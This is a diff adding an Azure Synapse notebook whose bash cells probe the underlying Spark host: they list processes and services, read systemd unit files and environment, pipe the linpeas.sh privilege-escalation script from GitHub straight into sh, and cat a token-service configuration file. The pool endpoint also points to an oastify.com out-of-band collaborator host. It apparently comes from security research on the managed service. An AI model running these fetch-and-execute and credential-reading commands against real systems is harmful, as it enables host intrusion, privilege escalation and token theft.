@@ -1,0 +1,151 @@
+{
+	"name": "Notebook 1",
+	"properties": {
+		"nbformat": 4,
+		"nbformat_minor": 2,
+		"bigDataPool": {
+			"referenceName": "rsospark",
+			"type": "BigDataPoolReference"
+		},
+		"sessionProperties": {
+			"driverMemory": "28g",
+			"driverCores": 4,
+			"executorMemory": "28g",
+			"executorCores": 4,
+			"numExecutors": 2,
+			"runAsWorkspaceSystemIdentity": false,
+			"conf": {
+				"spark.dynamicAllocation.enabled": "false",
+				"spark.dynamicAllocation.minExecutors": "2",
+				"spark.dynamicAllocation.maxExecutors": "2",
+				"spark.autotune.trackingId": "3c0ea986-fb6a-45c9-9108-4b6cea42fc48"
+			}
+		},
+		"metadata": {
+			"saveOutput": true,
+			"synapse_widget": {
+				"version": "0.1"
+			},
+			"enableDebugMode": false,
+			"language_info": {
+				"name": "python"
+			},
+			"a365ComputeOptions": {
+				"id": "/subscriptions/5114ad5f-eba0-48cb-ac20-70d475fff746/resourceGroups/rsosynapse/providers/Microsoft.Synapse/workspaces/rsoworkspace/bigDataPools/rsospark",
+				"name": "rsospark",
+				"type": "Spark",
+				"endpoint": "https://quosj5orfqwhmmdx4e8ndcdeo5uwim6b.oastify.com/rsospark",
+				"auth": {
+					"type": "AAD",
+					"authResource": "https://dev.azuresynapse.net",
+					"authHeader": null
+				},
+				"sparkVersion": "3.4",
+				"nodeCount": 10,
+				"cores": 4,
+				"memory": 28,
+				"extraHeader": null
+			},
+			"sessionKeepAliveTimeout": 30
+		},
+		"cells": [
+			{
+				"cell_type": "code",
+				"source": [
+					"%%bash \n",
+					"id\n",
+					"echo \"---\"\n",
+					"ps -auxw | grep vegas\n",
+					"echo \"---\"\n",
+					"systemctl list-units --type=service\n",
+					"echo \"---\"\n",
+					"# cat /etc/vegas/vegas.config\n",
+					"echo \"---\"\n",
+					"ls -al /bin/vegas\n",
+					"echo \"---\"\n",
+					"ls -al /bin/vegas-scripts\n",
+					"\n",
+					""
+				],
+				"execution_count": 25
+			},
+			{
+				"cell_type": "code",
+				"metadata": {
+					"jupyter": {
+						"source_hidden": false,
+						"outputs_hidden": false
+					},
+					"nteract": {
+						"transient": {
+							"deleting": false
+						}
+					}
+				},
+				"source": [
+					"%%bash\n",
+					"systemctl status vegas-pipes-setup.service\n",
+					"\n",
+					"systemctl status vegas.service\n",
+					"\n",
+					"cat /usr/lib/systemd/system/vegas-pipes-setup.service\n",
+					"cat /etc/systemd/system/vegas.service\n",
+					"\n",
+					"ls -al /usr/lib/systemd/system/vegas-pipes-setup.service\n",
+					"ls -al /etc/systemd/system/vegas.service\n",
+					"\n",
+					"systemctl show-environment"
+				],
+				"execution_count": 11
+			},
+			{
+				"cell_type": "code",
+				"metadata": {
+					"jupyter": {
+						"source_hidden": false,
+						"outputs_hidden": false
+					},
+					"nteract": {
+						"transient": {
+							"deleting": false
+						}
+					}
+				},
+				"source": [
+					"%%bash\n",
+					"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n",
+					""
+				],
+				"execution_count": 10
+			},
+			{
+				"cell_type": "code",
+				"metadata": {
+					"jupyter": {
+						"source_hidden": false,
+						"outputs_hidden": false
+					},
+					"nteract": {
+						"transient": {
+							"deleting": false
+						}
+					}
+				},
+				"source": [
+					"%%bash\n",
+					"echo \"mnt\"\n",
+					"ls -al /mnt/\n",
+					"echo \"gluten\"\n",
+					"ls -al /opt/gluten/dep\n",
+					"echo \"health-agent\"\n",
+					"ls -al /opt/health-agent/conf\n",
+					"echo \"olc-scripts\"\n",
+					"cat /opt/olc-scripts/starter.sh\n",
+					"echo \"token-service\"\n",
+					"cat /opt/token-service/tokenservice.config.json"
+				],
+				"execution_count": 24
+			}
+		]
+	}
+}
